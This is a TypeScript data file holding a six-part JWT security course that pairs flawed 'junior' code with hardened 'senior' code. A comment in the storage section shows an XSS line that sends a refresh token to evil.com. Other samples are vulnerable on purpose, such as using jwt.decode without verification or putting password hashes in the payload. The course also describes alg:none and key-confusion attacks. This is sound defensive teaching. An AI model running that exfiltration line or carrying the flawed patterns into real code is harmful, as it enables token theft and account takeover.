import { SkillRoadmap } from './types';

export const jwtRoadmap: SkillRoadmap = {
    skillId: 'jwt',
    skillName: 'JWT (JSON Web Tokens)',
    category: 'SERVER-SIDE',
    tagline: 'Stateless Token-Based Authentication, Cryptographic Signatures & Security Standards',
    accentColor: '#d63aff',
    officialDocs: [
        {
            title: 'JWT.io Official Debugger',
            url: 'https://jwt.io',
            description: 'Canonical token decoder, signature debugger, and RFC 7519 standard reference.',
            badge: 'Official Tool'
        },
        {
            title: 'RFC 7519: JSON Web Token Standard',
            url: 'https://datatracker.ietf.org/doc/html/rfc7519',
            description: 'The formal Internet Engineering Task Force (IETF) specification for JWTs.',
            badge: 'IETF RFC'
        },
        {
            title: 'OWASP JWT Security Cheat Sheet',
            url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html',
            description: 'Definitive vulnerability prevention guide covering key confusion, alg none, and cookie storage.',
            badge: 'Security Standard'
        }
    ],
    checkpoints: [
        {
            id: 'jwt-1',
            title: 'Anatomy of a JWT: Base64URL Header, Claims Payload & Signature',
            estMinutes: 5,
            concept: {
                summary: 'A JSON Web Token (JWT) is a compact, URL-safe string composed of three distinct Base64URL-encoded segments separated by dots: Header.Payload.Signature. The Header specifies the token type and cryptographic algorithm (e.g. HS256). The Payload contains registered claims (sub, iat, exp, iss) and custom claims (role, permissions). The Signature is produced by hashing the encoded header and payload with a cryptographic secret or private key. Crucially, standard JWTs are signed, NOT encrypted: any party can decode and read the payload, but any tampering with the payload invalidates the signature.',
                analogy: 'A signed university diploma sealed in clear plastic: anyone walking past can read your name, major, and graduation date through the transparent plastic (payload), but they cannot alter your GPA because the university\'s embossed holographic seal (cryptographic signature) will break if tampered with.',
                seniorInsight: 'Never place passwords, API keys, Social Security numbers, or confidential business data inside a standard JWT payload. Because Base64URL is simply an encoding scheme (not encryption), anyone who inspects the token string in network logs or headers can decode the entire payload instantly.'
            },
            trap: {
                title: 'Believing JWTs are encrypted and placing sensitive passwords or PII in the payload',
                juniorCode: `// ❌ JUNIOR: Assuming JWT is encrypted; storing sensitive credentials in payload
import jwt from 'jsonwebtoken';

const token = jwt.sign(
    {
        userId: 'usr_942',
        email: 'dev@acme.com',
        passwordHash: user.passwordHash, // 🚨 EXTREME VULNERABILITY: Hash exposed to client!
        stripeCustomerId: user.stripeId,
        ssn: user.ssn                   // 🚨 Decodable in browser with atob()
    },
    'jwt-secret-key'
);

// Anyone can decode this in browser console without the secret:
// JSON.parse(atob(token.split('.')[1]));`,
                seniorCode: `// ✅ SENIOR: Minimal, safe claims; zero sensitive credentials in payload
import jwt from 'jsonwebtoken';

interface TokenPayload {
    sub: string;       // Subject: Unique user identifier
    role: string;      // Authorization role
    iss: string;       // Issuer
    aud: string;       // Audience
}

export function createAccessToken(userId: string, role: string): string {
    const payload: TokenPayload = {
        sub: userId,
        role: role,
        iss: 'https://auth.acme.com',
        aud: 'https://api.acme.com'
    };

    return jwt.sign(payload, process.env.JWT_ACCESS_SECRET!, {
        algorithm: 'HS256',
        expiresIn: '15m' // Short lifespan limits exposure window
    });
}`,
                explanation: 'A JWT payload is public metadata with integrity verification. Keep claims minimal: user ID (sub), role, issuer, and expiration timestamp.'
            },
            drill: {
                question: 'How is the final cryptographic signature segment of a JWT mathematically generated under the HS256 algorithm?',
                hint: 'Look at the three parts separated by dots and what HMAC receives as input.',
                solution: `HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secretKey
)

The resulting binary digest is then Base64URL-encoded to form the 3rd and final segment. If even a single character in the header or payload changes, the HMAC digest will completely differ, failing verification.`,
                explanation: 'The signature mathematically binds the exact header and payload together with the secret key, ensuring tamper resistance.'
            },
            docLink: {
                title: 'RFC 7519: Section 3 - JSON Web Token (JWT) Overview',
                url: 'https://datatracker.ietf.org/doc/html/rfc7519#section-3',
                description: 'Official specification of JWT structure, claims sets, and compact serialization.'
            }
        },
        {
            id: 'jwt-2',
            title: 'Signing Algorithms: Symmetric (HS256) vs Asymmetric (RS256 / ES256)',
            estMinutes: 5,
            concept: {
                summary: 'JWTs support two primary cryptographic paradigms: Symmetric (HMAC with SHA-256 / HS256) and Asymmetric (RSA / RS256 or ECDSA / ES256). In HS256, the exact same shared secret is used to both sign the token and verify it; this works well for monolithic apps, but if an external service needs to verify tokens, you must share the secret (which would allow them to forge tokens too). In RS256/ES256, the authorization server holds a Private Key to sign tokens, while any microservice or client can verify tokens using the corresponding Public Key (often served via a JWKS endpoint: /.well-known/jwks.json).',
                analogy: 'HS256 is a shared combination safe: anyone who knows the combination to open and check the document also has the ability to lock and alter it. RS256 is an artist signature stamp: only the artist owns the physical stamp (private key), but millions of gallery experts can verify the stamp against museum records (public key) without being able to forge the painting.',
                seniorInsight: 'For enterprise microservices, always choose RS256 or ES256 with a JWKS (JSON Web Key Set) endpoint. This allows downstream APIs to verify token validity independently without making network roundtrips to the auth server and without holding the signing key.'
            },
            trap: {
                title: 'Hardcoding weak shared secrets or confusing public/private keys',
                juniorCode: `// ❌ JUNIOR: Weak, dictionary-guessable secret in HS256
import jwt from 'jsonwebtoken';

// Trivial for attackers to crack in seconds using Hashcat / John the Ripper
const SECRET = 'my-secret-123';

export const signToken = (id: string) => {
    return jwt.sign({ id }, SECRET);
};`,
                seniorCode: `// ✅ SENIOR: High-entropy secret validation or Asymmetric RS256 keypair
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';

// In production: Asymmetric private/public keys loaded from secure environment
const PRIVATE_KEY = process.env.JWT_PRIVATE_KEY!; // PEM formatted RSA 2048+ bit
const PUBLIC_KEY = process.env.JWT_PUBLIC_KEY!;

export function signRSAToken(userId: string): string {
    return jwt.sign({ sub: userId }, PRIVATE_KEY, {
        algorithm: 'RS256',
        expiresIn: '15m',
        issuer: 'auth.service',
        audience: 'api.service'
    });
}

export function verifyRSAToken(token: string): jwt.JwtPayload {
    return jwt.verify(token, PUBLIC_KEY, {
        algorithms: ['RS256'], // Explicitly whitelist algorithm to block alg:none
        issuer: 'auth.service',
        audience: 'api.service'
    }) as jwt.JwtPayload;
}`,
                explanation: 'Asymmetric keys allow distributed verification without spreading private signing authority across multiple microservices.'
            },
            drill: {
                question: 'Why should microservice architectures prefer RS256/ES256 over HS256 for token verification?',
                hint: 'Consider what secret keys each microservice would need to hold under HS256.',
                solution: `Under HS256, every microservice that validates incoming requests must have the shared secret key. If any single microservice is compromised, the attacker obtains the secret and can forge valid administrator tokens for the entire ecosystem.
Under RS256, microservices only receive the Public Key, which can only VERIFY tokens. Only the dedicated Auth Server possesses the Private Key to SIGN tokens.`,
                explanation: 'Asymmetric cryptography follows the principle of least privilege: verification without signing capability.'
            },
            docLink: {
                title: 'RFC 7518: JSON Web Algorithms (JWA)',
                url: 'https://datatracker.ietf.org/doc/html/rfc7518',
                description: 'Cryptographic algorithms for digital signatures and MACs in JSON Web Tokens.'
            }
        },
        {
            id: 'jwt-3',
            title: 'Dual-Token Architecture: Short-Lived Access Tokens & Refresh Rotation (RTR)',
            estMinutes: 5,
            concept: {
                summary: 'Stateless access tokens cannot be revoked on a whim without querying a database. The industry standard solution is a Dual-Token Architecture: (1) Access Token: Short-lived (10-15 minutes), stateless, verified purely through cryptography on every API call. (2) Refresh Token: Long-lived (7-30 days), stored in the database, used strictly to request a new access token. Under Refresh Token Rotation (RTR), whenever a refresh token is used, it is destroyed and replaced with a new one. If an invalidated refresh token is presented again (indicating token theft), the server immediately invalidates all tokens in that user\'s family.',
                analogy: 'A keycard to an airport VIP lounge: the keycard (access token) expires after 15 minutes of inactivity. To re-enter, you present your passport (refresh token) to the desk agent; the agent inspects it, stamps a hole through it so it can never be used again, and hands you a brand-new passport and a fresh 15-minute keycard.',
                seniorInsight: 'Store a `familyId` (UUID) or `tokenVersion` on each refresh token. When rotating tokens, issue a new token with the same family ID. If a previously consumed token in that family is submitted again, trigger an automatic security alert and revoke all active refresh tokens for that user.'
            },
            trap: {
                title: 'Issuing a single perpetual JWT valid for 30 days without revocation capability',
                juniorCode: `// ❌ JUNIOR: 30-day stateless token; impossible to revoke if stolen!
const token = jwt.sign(
    { userId: user.id }, 
    SECRET, 
    { expiresIn: '30d' } // If stolen, attacker has full account control for a month!
);

// User changes password or clicks "Log Out", but old token is still 100% valid!`,
                seniorCode: `// ✅ SENIOR: Short access token (15m) + rotated refresh token (7d)
import crypto from 'node:crypto';
import jwt from 'jsonwebtoken';

export interface TokenPair {
    accessToken: string;
    refreshToken: string;
}

export async function generateTokenPair(userId: string): Promise<TokenPair> {
    const accessToken = jwt.sign(
        { sub: userId },
        process.env.JWT_ACCESS_SECRET!,
        { expiresIn: '15m' }
    );

    // Opaque, high-entropy crypto string for refresh token
    const refreshToken = crypto.randomBytes(40).toString('hex');
    const hashedRefresh = crypto.createHash('sha256').update(refreshToken).digest('hex');

    // Persist hashed refresh token with family tracking in DB
    await db.refreshToken.create({
        data: {
            tokenHash: hashedRefresh,
            userId,
            expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
        }
    });

    return { accessToken, refreshToken };
}`,
                explanation: 'Short-lived access tokens limit the vulnerability window, while opaque, database-backed refresh tokens permit instant session termination.'
            },
            drill: {
                question: 'What is the security purpose of Refresh Token Rotation (RTR) with reuse detection?',
                hint: 'What happens if both the legitimate user and an attacker hold the same refresh token?',
                solution: `If an attacker intercepts a refresh token, either the legitimate user or the attacker will use it first to obtain a new token pair.
When the second party attempts to use the now-expired/consumed refresh token, the server detects reuse, recognizes a token theft event, and immediately revokes all tokens issued to that family/user, locking the attacker out.`,
                explanation: 'Reuse detection turns a passive token leak into an active defense mechanism that terminates stolen sessions.'
            },
            docLink: {
                title: 'Auth0 Architecture: Refresh Token Rotation',
                url: 'https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation',
                description: 'Comprehensive guide to mitigating token theft with refresh token rotation.'
            }
        },
        {
            id: 'jwt-4',
            title: 'Token Storage Security: HttpOnly Cookies vs LocalStorage (XSS & CSRF)',
            estMinutes: 5,
            concept: {
                summary: 'Where a client stores tokens determines its vulnerability to attack. Storing JWTs in browser `localStorage` or `sessionStorage` is fundamentally insecure against Cross-Site Scripting (XSS): any malicious third-party script, compromised CDN dependency, or injected HTML can read `localStorage.getItem(\'token\')` and exfiltrate it to an attacker\'s server. The secure solution is storing the Refresh Token in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie, completely inaccessible to JavaScript. The Access Token can be held in client memory (React state / module variable) so it never touches disk.',
                analogy: 'LocalStorage is writing your house key code on a sticky note attached to your front door: anyone walking by (malicious script) can read it and copy it. An HttpOnly cookie is a pneumatic dispatch tube inside the wall: browser requests pass through it automatically, but your hands (JavaScript) cannot reach inside the tube to extract the key.',
                seniorInsight: 'Scope your refresh cookie path strictly to `/api/auth/refresh` (`path: \'/api/auth/refresh\'`). This ensures the browser only sends the cookie when specifically refreshing tokens, not on every standard API or static asset request.'
            },
            trap: {
                title: 'Saving JWTs in localStorage where XSS attacks can read and exfiltrate them',
                juniorCode: `// ❌ JUNIOR: Saving tokens in localStorage
// In frontend client:
const response = await fetch('/api/login', { ... });
const data = await response.json();
localStorage.setItem('accessToken', data.accessToken);
localStorage.setItem('refreshToken', data.refreshToken);

// 🚨 Any XSS vulnerability can now run:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('refreshToken'))`,
                seniorCode: `// ✅ SENIOR: HttpOnly, Secure, SameSite Cookie + Memory Storage
// In server response header (Set-Cookie):
// Set-Cookie: refreshToken=...; Path=/api/auth/refresh; HttpOnly; Secure; SameSite=Strict; Max-Age=604800

export const cookieOptions = {
    httpOnly: true,  // Prevents client JavaScript (XSS) from reading the cookie
    secure: process.env.NODE_ENV === 'production', // Only transmitted over HTTPS
    sameSite: 'strict' as const, // Prevents CSRF by blocking cross-site transmission
    path: '/api/auth/refresh',   // Sent ONLY on refresh endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days in milliseconds
};

// In frontend client:
// Access Token kept in memory (closure/React state)
// When tab refreshes, an initial silent call to /api/auth/refresh gets a fresh Access Token`,
                explanation: 'HttpOnly prevents client scripts from reading the token, Secure enforces TLS, and SameSite blocks CSRF exploits.'
            },
            drill: {
                question: 'If storing a refresh token in an HttpOnly cookie protects it from XSS, what attack does it become vulnerable to, and how is that attack mitigated?',
                hint: 'Browsers automatically attach cookies to cross-site requests unless restricted.',
                solution: `Cookies are vulnerable to Cross-Site Request Forgery (CSRF), where a malicious website tricks a user's browser into submitting unauthorized requests to your API.
It is mitigated by setting "SameSite=Strict" (or "SameSite=Lax"), which tells the browser never to send the cookie on cross-site requests, and optionally requiring custom CSRF tokens or Anti-CSRF headers.`,
                explanation: 'Pairing HttpOnly with SameSite=Strict neutralizes both XSS token extraction and CSRF cross-origin replay.'
            },
            docLink: {
                title: 'OWASP: HTML5 Web Storage Security Cheat Sheet',
                url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage',
                description: 'Official OWASP analysis of localStorage risks vs HttpOnly cookie security.'
            }
        },
        {
            id: 'jwt-5',
            title: 'Stateless Revocation & Invalidation: Redis Blacklists & Token Versioning',
            estMinutes: 5,
            concept: {
                summary: 'By design, a signed JWT is self-contained and stateless: as long as its signature is mathematically valid and its `exp` timestamp has not passed, any server will accept it. When a user logs out, resets their password, or is banned, the server cannot "delete" a stateless token that is already in the wild. Two proven architectural patterns solve this: (1) Redis Denylist: Store the token\'s unique `jti` (JWT ID) in Redis with a TTL equal to the token\'s remaining lifetime. (2) Token Versioning: Include a `tokenVersion: number` claim in the token, stored on the user\'s DB profile. Incrementing the number immediately invalidates all tokens with the old version.',
                analogy: 'A subway punch card: the conductor can check that the card was stamped by the city transit office (signature). If a criminal stole punch cards, the city distributes a "stolen cards list" (Redis denylist) to turnstiles. After the expiration date, the city removes old numbers from the list because the card has naturally expired anyway.',
                seniorInsight: 'When storing revoked JWTs in Redis, ALWAYS set the Redis key TTL equal to `exp - Date.now()`. Once a token naturally expires, Redis automatically evicts the key, preventing the denylist from growing infinitely in memory.'
            },
            trap: {
                title: 'Relying on client-side token deletion for logout without server-side invalidation',
                juniorCode: `// ❌ JUNIOR: "Logout" that only deletes the token on the client
// Client side:
function logout() {
    localStorage.removeItem('token'); // 🚨 Token is still 100% valid on the server!
    window.location.href = '/login';
}

// If an attacker intercepted the token prior to logout, they can continue making
// authorized API calls until the token naturally expires!`,
                seniorCode: `// ✅ SENIOR: Token JTI revocation stored in Redis with auto-expiring TTL
import jwt from 'jsonwebtoken';

interface CustomJwtPayload extends jwt.JwtPayload {
    jti: string; // Unique token identifier (UUID)
}

export async function revokeToken(token: string): Promise<void> {
    const decoded = jwt.decode(token) as CustomJwtPayload | null;
    if (!decoded || !decoded.jti || !decoded.exp) return;

    const remainingTtlSeconds = decoded.exp - Math.floor(Date.now() / 1000);
    if (remainingTtlSeconds > 0) {
        // Store in Redis with TTL so it auto-evicts when token naturally expires
        await redis.setex(\`blacklist:\${decoded.jti}\`, remainingTtlSeconds, 'revoked');
    }
}

export async function isTokenRevoked(jti: string): Promise<boolean> {
    const status = await redis.get(\`blacklist:\${jti}\`);
    return status === 'revoked';
}`,
                explanation: 'Using JTI blacklist in Redis with automatic TTL allows instant revocation while keeping memory footprint bounded.'
            },
            drill: {
                question: 'Why is setting the Redis key TTL to (exp - now) critical when implementing a JWT denylist?',
                hint: 'What happens to the Redis memory usage if millions of revoked tokens are never deleted?',
                solution: `If TTL is not set, revoked tokens will accumulate indefinitely in Redis memory.
Because a JWT becomes invalid naturally once its expiration timestamp (exp) passes, there is zero benefit to keeping its JTI in the blacklist after exp. Setting TTL to (exp - now) guarantees automatic garbage collection without cron cleanup jobs.`,
                explanation: 'Bounded TTL matches the token lifecycle, guaranteeing constant-size memory usage in high-volume systems.'
            },
            docLink: {
                title: 'Redis Patterns: Distributed Token Blacklisting',
                url: 'https://redis.io/docs/latest/develop/use/patterns/',
                description: 'High-throughput token invalidation patterns using Redis key expiry.'
            }
        },
        {
            id: 'jwt-6',
            title: 'JWT Attack Vectors & Hardened Verification: alg none & Key Confusion',
            estMinutes: 5,
            concept: {
                summary: 'Standard JWT implementations are vulnerable to specific cryptographic exploits if verification parameters are not strictly configured: (1) The "alg: none" Vulnerability: An attacker modifies the header to `{"alg": "none"}`, removes the signature segment entirely, and weak libraries accept the token as valid. (2) Key Confusion / Algorithm Switching: An attacker switches the algorithm from RS256 to HS256, then signs the token using the server\'s public RSA key as the HMAC shared secret. (3) Secret Brute-Forcing: If the HMAC secret is weak, offline wordlist attacks can uncover it in seconds.',
                analogy: 'A security guard who accepts an ID card that says "Signature Verification: Not Required" (alg: none) because the card issuer forgot to tell the guard that signatures are mandatory on all credentials.',
                seniorInsight: 'Always explicitly specify the `algorithms` array when calling `jwt.verify(token, secret, { algorithms: [\'HS256\'] })`. Never let the token\'s header dictate which algorithm is used during verification.'
            },
            trap: {
                title: 'Using jwt.decode() instead of jwt.verify() or trusting the header algorithm',
                juniorCode: `// ❌ JUNIOR: jwt.decode does NOT verify the signature!
import jwt from 'jsonwebtoken';

export function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    // 🚨 FATAL MISTAKE: jwt.decode merely parses Base64URL payload WITHOUT checking signature!
    const user = jwt.decode(token); 
    
    // Attacker can pass ANY forged token with { role: "SUPER_ADMIN" } and gain full access!
    req.user = user;
    next();
}`,
                seniorCode: `// ✅ SENIOR: Strict cryptographic verification with algorithm whitelisting
import jwt from 'jsonwebtoken';

export function verifyAccessToken(token: string): jwt.JwtPayload {
    return jwt.verify(token, process.env.JWT_ACCESS_SECRET!, {
        algorithms: ['HS256'], // Explicit whitelist prevents alg:none and key confusion
        issuer: 'https://auth.acme.com',
        audience: 'https://api.acme.com',
        clockTolerance: 10 // Max 10 seconds leeway for server time-drift
    }) as jwt.JwtPayload;
}`,
                explanation: 'Explicitly whitelisting the algorithm during verification completely eliminates the alg:none exploit and key confusion attacks.'
            },
            drill: {
                question: 'What is the critical security difference between `jwt.decode(token)` and `jwt.verify(token, secret)`?',
                hint: 'What does decode do to the signature?',
                solution: `jwt.decode() only parses and extracts the JSON from the Base64URL string. It does NOT perform any signature verification or expiration checks. Anyone can forge a JWT with arbitrary claims and pass it to jwt.decode().
jwt.verify() computes the cryptographic HMAC or RSA signature of the token and verifies it matches the signature segment, while also checking exp, nbf, iss, and aud.`,
                explanation: 'Always use jwt.verify() for authorization. Never trust decoded claims without signature verification.'
            },
            docLink: {
                title: 'PortSwigger Web Security: JWT Attacks & Exploitation',
                url: 'https://portswigger.net/web-security/jwt',
                description: 'Comprehensive analysis of algorithm confusion, none algorithm, and signature validation flaws.'
            }
        }
    ]
};
